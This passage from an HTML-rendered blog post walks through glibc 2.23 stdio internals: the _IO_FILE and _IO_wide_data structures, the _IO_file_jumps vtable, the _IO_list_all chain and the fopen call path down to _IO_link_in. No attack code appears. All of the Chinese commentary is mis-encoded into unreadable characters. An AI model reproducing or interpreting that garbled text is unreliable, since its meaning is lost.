class="hljs-type">wchar_t</span> *_IO_buf_end;<span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_save_base;<span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_backup_base;<span class="hljs-comment">/* Pointer to first valid character of</span><br><span class="hljs-comment">   backup area */</span><br>  <span class="hljs-type">wchar_t</span> *_IO_save_end;<span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-type">__mbstate_t</span> _IO_state;<br>  <span class="hljs-type">__mbstate_t</span> _IO_last_state;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> _<span class="hljs-title">codecvt</span>;</span><br><br>  <span class="hljs-type">wchar_t</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *_<span class="hljs-title">wide_vtable</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="IO-file-jumps"><a href="#IO-file-jumps" class="headerlink" title="_IO_file_jumps"></a>_IO_file_jumps</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_file_jumps</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_file_finish),<br>  JUMP_INIT(overflow, _IO_file_overflow),<br>  JUMP_INIT(underflow, _IO_file_underflow),<br>  JUMP_INIT(uflow, _IO_default_uflow),<br>  JUMP_INIT(pbackfail, _IO_default_pbackfail),<br>  JUMP_INIT(xsputn, _IO_file_xsputn),<br>  JUMP_INIT(xsgetn, _IO_file_xsgetn),<br>  JUMP_INIT(seekoff, _IO_new_file_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_new_file_setbuf),<br>  JUMP_INIT(sync, _IO_new_file_sync),<br>  JUMP_INIT(doallocate, _IO_file_doallocate),<br>  JUMP_INIT(read, _IO_file_read),<br>  JUMP_INIT(write, _IO_new_file_write),<br>  JUMP_INIT(seek, _IO_file_seek),<br>  JUMP_INIT(close, _IO_file_close),<br>  JUMP_INIT(stat, _IO_file_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­çš„å®å®šä¹‰å¦‚ä¸‹ï¼Œå®é™…ä¸Šå°±æ˜¯å„ä¸ªå‡½æ•°çš„è·³è½¬è¡¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">JUMP_INIT(dummy, <span class="hljs-number">0</span>), JUMP_INIT (dummy2, <span class="hljs-number">0</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> JUMP_INIT(NAME,VALUE) VALUE</span><br></code></pre></td></tr></table></figure><h2 id="IO-list-all"><a href="#IO-list-all" class="headerlink" title="_IO_list_all"></a>_IO_list_all</h2><p>_IO_list_all-&gt;_IO_2_1_stderr_-&gt;_IO_2_1_stdout_-&gt;_IO_2_1_stdin_</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\stdfiles.c</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> *_<span class="hljs-title">IO_list_all</span> =</span> &amp;_IO_2_1_stderr_;<br></code></pre></td></tr></table></figure><p>_IO_2_1_stderr_ã€_IO_2_1_stdout_å’Œ_IO_2_1_stdin_çš„å®šä¹‰å…¶å®åœ¨è¿™ï¼ˆæœç´¢çš„æ—¶å€™æ²¡æ‰¾åˆ°ï¼‰</p><blockquote><p>ççˆ±ç”Ÿå‘½ï¼Œè¿œç¦»å®å®šä¹‰</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\stdfiles.c</span><br><br>DEF_STDFILE(_IO_2_1_stdin_, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, _IO_NO_WRITES);<br>DEF_STDFILE(_IO_2_1_stdout_, <span class="hljs-number">1</span>, &amp;_IO_2_1_stdin_, _IO_NO_READS);<br>DEF_STDFILE(_IO_2_1_stderr_, <span class="hljs-number">2</span>, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€å±‚å®å®šä¹‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \</span><br><span class="hljs-meta">  static struct _IO_wide_data _IO_wide_data_##FD \</span><br><span class="hljs-meta">    = &#123; ._wide_vtable = &amp;_IO_wfile_jumps &#125;; \</span><br><span class="hljs-meta">  struct _IO_FILE_plus NAME \</span><br><span class="hljs-meta">    = &#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, &amp;_IO_wide_data_##FD), \</span><br><span class="hljs-meta">       &amp;_IO_file_jumps&#125;;</span><br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \</span><br><span class="hljs-meta">  struct _IO_FILE_plus NAME \</span><br><span class="hljs-meta">    = &#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, NULL), \</span><br><span class="hljs-meta">       &amp;_IO_file_jumps&#125;;</span><br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€å±‚è§£å®å®šä¹‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> _<span class="hljs-title">IO_2_1_stdin_</span> =</span> &#123;FILEBUF_LITERAL(<span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>), &amp;_IO_file_jumps&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> _<span class="hljs-title">IO_2_1_stdout_</span> =</span> &#123;FILEBUF_LITERAL(&amp;_IO_2_1_stdin_, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>), &amp;_IO_file_jumps&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> _<span class="hljs-title">IO_2_1_stderr_</span> =</span> &#123;FILEBUF_LITERAL(&amp;_IO_2_1_stdout_, <span class="hljs-number">4</span>+<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-literal">NULL</span>), &amp;_IO_file_jumps&#125;;<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚å®å®šä¹‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\libioP.h</span><br><br><span class="hljs-meta">#   <span class="hljs-keyword">define</span> FILEBUF_LITERAL(CHAIN, FLAGS, FD, WDP) \</span><br><span class="hljs-meta">       &#123; _IO_MAGIC+_IO_LINKED+_IO_IS_FILEBUF+FLAGS, \</span><br><span class="hljs-meta"> 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, (_IO_FILE *) CHAIN, FD, \</span><br><span class="hljs-meta"> 0, _IO_pos_BAD, 0, 0, &#123; 0 &#125;, 0, _IO_pos_BAD, \</span><br><span class="hljs-meta"> 0 &#125;</span><br></code></pre></td></tr></table></figure><h2 id="IO-list-all-stamp"><a href="#IO-list-all-stamp" class="headerlink" title="_IO_list_all_stamp"></a>_IO_list_all_stamp</h2><p>è®°å½•_IO_list_allå•é“¾è¡¨æ›´æ”¹çš„æ¬¡æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-comment">/* Used to signal modifications to the list of FILE decriptors.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> _IO_list_all_stamp;<br></code></pre></td></tr></table></figure><h1 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h1><p>å‡½æ•°è°ƒç”¨æµç¨‹å›¾ï¼š</p><img src="/2023/02/10/IO%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/fopen.jpg" class title="fopen"><p>stdio.hä¸­çš„fopenå®é™…ä¸Šæ˜¯_IO_new_fopen</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\include\stdio.h</span><br><br><span class="hljs-keyword">extern</span> _IO_FILE *_IO_new_fopen (<span class="hljs-type">const</span> <span class="hljs-type">char</span>*, <span class="hljs-type">const</span> <span class="hljs-type">char</span>*);<br><span class="hljs-meta">#   <span class="hljs-keyword">define</span> fopen(fname, mode) _IO_new_fopen (fname, mode)</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…iofopen.cä¸­ä¹Ÿæœ‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\iofopen.c</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_new_fopen fopen</span><br></code></pre></td></tr></table></figure><p>_IO_new_fopenåˆè°ƒç”¨äº†__fopen_internal</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\iofopen.c</span><br><br>_IO_FILE *<br>_IO_new_fopen (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode)<br>&#123;<br>  <span class="hljs-keyword">return</span> __fopen_internal (filename, mode, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>__fopen_internalçš„æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>mallocåˆ†é…å†…å­˜</li><li>è°ƒç”¨_IO_no_init nullåˆå§‹åŒ–ç»“æ„ä½“æ•°æ®</li><li>è®¾ç½®vtableä¸º_IO_file_jumps</li><li>å°†_IO_FILEç»“æ„ä½“é“¾å…¥_IO_list_all</li><li>æ‰“å¼€æ–‡ä»¶<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\iofopen.c</span><br><br>_IO_FILE *<br>__fopen_internal (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode, <span class="hljs-type">int</span> is32)<br>&#123;<br><span class="hljs-comment">//æ­¥éª¤ä¸€ï¼šä¸ºlocked_FILEç»“æ„ä½“new_fåˆ†é…å†…å®¹</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">locked_FILE</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> <span class="hljs-title">fp</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>    _IO_lock_t lock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> <span class="hljs-title">wd</span>;</span><br>  &#125; *new_f = (<span class="hljs-keyword">struct</span> locked_FILE *) <span class="hljs-built_in">malloc</span> (<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> locked_FILE));<br><br><span class="hljs-comment">//å¦‚æœåˆ†é…å†…å­˜å¤±è´¥ç›´æ¥è¿”å›</span><br>  <span class="hljs-keyword">if</span> (new_f == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//æ­¥éª¤äºŒï¼šè°ƒç”¨_IO_no_initåˆå§‹åŒ–_IO_FILE</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//åˆå§‹åŒ–(&amp;new_f-&gt;fp)-&gt;vtableä¸º_IO_file_jumps</span><br><span class="hljs-comment">//#define _IO_JUMPS(THIS) (THIS)-&gt;vtable</span><br>  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;<br><br><span class="hljs-comment">//æ­¥éª¤ä¸‰ï¼šè°ƒç”¨_IO_file_initå°†_IO_FILE_plusç»“æ„ä½“é“¾å…¥_IO_list_all</span><br>  _IO_file_init (&amp;new_f-&gt;fp);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span><br>  new_f-&gt;fp.vtable = <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//æ­¥éª¤å››ï¼šè°ƒç”¨_IO_file_fopenæ‰“å¼€æ–‡ä»¶</span><br><span class="hljs-comment">//æˆåŠŸåˆ™è°ƒç”¨__fopen_maybe_mmapï¼Œæœ€ç»ˆè¿”å›ä¸€ä¸ª_IO_FILEç»“æ„ä½“</span><br>  <span class="hljs-keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);<br><br><span class="hljs-comment">//å¦‚æœå¤±è´¥åˆ™å°†_IO_FILE_plusä»å•é“¾è¡¨ä¸­æ‘˜é™¤ï¼Œé‡Šæ”¾ç»“æ„ä½“å¹¶è¿”å›null</span><br>  _IO_un_link (&amp;new_f-&gt;fp);<br>  <span class="hljs-built_in">free</span> (new_f);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="IO-no-init"><a href="#IO-no-init" class="headerlink" title="_IO_no_init"></a>_IO_no_init</h2><p>è°ƒç”¨äº†_IO_old_initï¼Œç„¶åè¿›è¡Œäº†ä¸€ç³»åˆ—nullåˆå§‹åŒ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_no_init (_IO_FILE *fp, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> orientation,<br>     <span class="hljs-keyword">struct</span> _IO_wide_data *wd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *jmp)<br>&#123;<br>  _IO_old_init (fp, flags);<br>  fp-&gt;_mode = orientation;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-keyword">if</span> (orientation &gt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      fp-&gt;_wide_data = wd;<br>      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="hljs-literal">NULL</span>;<br>      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="hljs-literal">NULL</span>;<br><br>      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-comment">/* Cause predictable crash when a wide function is called on a byte</span><br><span class="hljs-comment">       stream.  */</span><br>    fp-&gt;_wide_data = (<span class="hljs-keyword">struct</span> _IO_wide_data *) <span class="hljs-number">-1L</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  fp-&gt;_freeres_list = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IO-old-init"><a href="#IO-old-init" class="headerlink" title="_IO_old_init"></a>_IO_old_init</h3><p>ä¹Ÿæ˜¯ä¸€ç³»åˆ—nullåˆå§‹åŒ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_old_init (_IO_FILE *fp, <span class="hljs-type">int</span> flags)<br>&#123;<br>  fp-&gt;_flags = _IO_MAGIC|flags;<br>  fp-&gt;_flags2 = <span class="hljs-number">0</span>;<br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_buf_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_read_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_read_ptr = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_read_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_write_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_write_ptr = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_write_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_chain = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">/* Not necessary. */</span><br><br>  fp-&gt;_IO_save_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_backup_base = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_IO_save_end = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_markers = <span class="hljs-literal">NULL</span>;<br>  fp-&gt;_cur_column = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _IO_JUMPS_OFFSET</span><br>  fp-&gt;_vtable_offset = <span class="hljs-number">0</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_lock != <span class="hljs-literal">NULL</span>)<br>    _IO_lock_init (*fp-&gt;_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO-file-init"><a href="#IO-file-init" class="headerlink" title="_IO_file_init"></a>_IO_file_init</h2><p>_IO_file_initä¹Ÿæ˜¯ä¸€ä¸ªå®ï¼Œå®é™…è°ƒç”¨çš„å‡½æ•°æ˜¯_IO_new_file_init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _IO_new_file_init _IO_file_init</span><br></code></pre></td></tr></table></figure><p>_IO_new_file_initè¿›è¡Œäº†ä¸€äº›åˆå§‹åŒ–å¹¶è°ƒç”¨äº†_IO_link_in</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-type">void</span><br>_IO_new_file_init (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br>  <span class="hljs-comment">/* POSIX.1 allows another file handle to be used to change the position</span><br><span class="hljs-comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span><br><span class="hljs-comment">     position before we do the first fseek (and until a following fflush). */</span><br>  fp-&gt;file._offset = _IO_pos_BAD;<span class="hljs-comment">//å…¶å®å°±æ˜¯-1</span><br>  fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;<br><br>  _IO_link_in (fp);<br>  fp-&gt;file._fileno = <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\fileops.c</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLOSED_FILEBUF_FLAGS \</span><br><span class="hljs-meta">  (_IO_IS_FILEBUF+_IO_NO_READS+_IO_NO_WRITES+_IO_TIED_PUT_GET)</span><br><span class="hljs-comment">//0x2000+0x4+0x8+0x400</span><br></code></pre></td></tr></table></figure><h3 id="IO-link-in"><a href="#IO-link-in" class="headerlink" title="_IO_link_in"></a>_IO_link_in</h3><p>_IO_link_inå°†_IO_FILE_plusç»“æ„ä½“é“¾å…¥_IO_list_allå•é“¾è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\genops.c</span><br><br><span class="hljs-type">void</span><br>_IO_link_in (<span class="hljs-keyword">struct</span> _IO_FILE_plus *fp)<br>&#123;<br><span class="hljs-comment">//æ£€æŸ¥flagçš„æ ‡å¿—ä½æ˜¯å¦æ˜¯_IO_LINKED</span><br>  <span class="hljs-keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-comment">//è®¾ç½®_IO_LINKED</span><br>      fp-&gt;file._flags |= _IO_LINKED;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_cleanup_region_start_noarg (flush_cleanup);<br>      _IO_lock_lock (list_all_lock);<br>      run_fp = (_IO_FILE *) fp;<br>      _IO_flockfile ((_IO_FILE *) fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//å°†ç»“æ„ä½“é“¾å…¥_IO_list_allï¼Œé€’å¢_IO_list_all_stamp</span><br>      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;<br>      _IO_list_all = fp;<br>      ++_IO_list_all_stamp;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>      _IO_funlockfile ((_IO_FILE *) fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>      _IO_lock_unlock (list_all_lock);<br>      _IO_cleanup_region_end (<span 